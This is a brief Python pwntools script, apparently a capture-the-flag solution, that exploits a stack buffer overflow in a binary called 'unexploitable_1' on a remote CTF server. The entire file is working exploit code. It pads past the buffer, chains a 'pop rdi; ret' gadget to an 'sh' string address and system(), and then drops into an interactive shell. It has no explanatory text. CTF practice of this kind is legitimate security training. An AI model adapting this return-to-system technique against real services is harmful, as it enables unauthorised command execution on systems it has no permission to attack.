#!/usr/bin/python3

from pwn import *

#p = process("./unexploitable_1")
p = remote("ctf.j0n9hyun.xyz", 3023)
e = ELF("./unexploitable_1")

#context.log_level = 'debug'
context.arch = 'x86_64'

padding = "A"*0x18
gadget = 0x004007d3     # pop rdi; ret
binsh = "sh"

rtl = p64(gadget)
rtl += p64(0x4003bf)
rtl += p64(e.symbols['system'])

payload = padding.encode('utf-8')
payload += rtl

p.recvline()
p.sendline(payload)

p.interactive()
